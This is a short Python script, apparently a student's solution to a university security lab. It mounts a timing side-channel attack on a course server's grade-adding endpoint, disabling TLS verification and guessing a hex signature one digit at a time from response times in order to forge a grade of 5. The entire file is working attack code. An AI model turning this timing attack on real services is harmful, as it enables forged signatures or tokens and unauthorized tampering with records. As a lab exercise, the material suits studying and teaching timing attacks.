# -*- coding: utf-8 -*-
"""
Created on Tue Dec  5 15:58:33 2017

@author: David Cartbo
"""
import urllib.request
import ssl
import time


def find_signature(name,grade):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    url = "https://eitn41.eit.lth.se:3119/ha4/addgrade.php?name="
    signature = ''
    new_url = 'https://eitn41.eit.lth.se:3119/ha4/addgrade.php?name=Kalle&grade=5&signature=ab9df8fef97066de99ff'
    f = urllib.request.urlopen(new_url, context=ctx)
    y = 10
    for i in range(19):
        print(signature)
        time_list = [0]*16
        vote_list = [0]*16
        for k in range(16):
            new_url = url + name + '&grade=' + str(grade) + '&signature=' + signature + (hex(k)[2])
            for x in range(y):
                start_time = time.time()
                f = urllib.request.urlopen(new_url, context=ctx)
                #response = f.read()
                time_list[k] = (time.time() - start_time)
            vote_list[time_list.index(max(time_list))] += 1
        signature += hex(vote_list.index(max(vote_list)))[2]
    for n in range(16):
        new_url = url + name + '&grade=' + str(grade) + '&signature=' + signature + (hex(n)[2])
        f = urllib.request.urlopen(new_url, context=ctx)
        if int(f.read()) == 1:
            return signature
    return 0


print(find_signature('Kalle',5))
